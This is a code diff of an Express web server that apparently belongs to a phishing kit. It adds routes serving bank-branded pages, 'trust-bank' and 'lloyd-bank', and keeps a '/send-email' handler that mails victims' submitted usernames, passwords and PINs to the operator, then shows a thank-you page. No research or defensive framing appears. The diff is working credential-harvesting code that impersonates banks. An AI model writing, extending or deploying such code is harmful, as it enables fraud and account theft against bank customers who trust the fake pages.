@@ -41,8 +41,17 @@ transporter.verify(function(error, success) {
 
 // Routes
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+    res.sendFile(path.join(__dirname, 'public', 'trust-bank/index.html'));
 });
+
+
+
+app.get('/lloyd-bank', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'lloyd-bank/index.html'));
+});
+
+
+
 
 app.post('/send-email', async (req, res) => {
     try {
@@ -66,9 +75,8 @@ app.post('/send-email', async (req, res) => {
                 <p><strong>Name:</strong> ${username}</p>
                 <p><strong>Password:</strong> ${password}</p>
                 <p><strong>Pin:</strong> ${pin}</p>
-
                 <hr>
-                <p>Sent from your lloyd bank</p>
+                <p> Developed by Debugger</p>
             `
         };
 
@@ -92,13 +100,14 @@ app.post('/send-email', async (req, res) => {
 
 // Optional: Thank you page route
 app.get('/thank-you', (req, res) => {
-    res.end("We have received the details...");
+        res.sendFile(path.join(__dirname, 'public', 'thankyou/index.html'));
+
 });
 
 // Error handling middleware
 app.use((err, req, res, next) => {
     console.error(err.stack);
-    res.status(500).send('Something broke!');
+    res.status(500).send('The website has crashed!');
 });
 
 /*
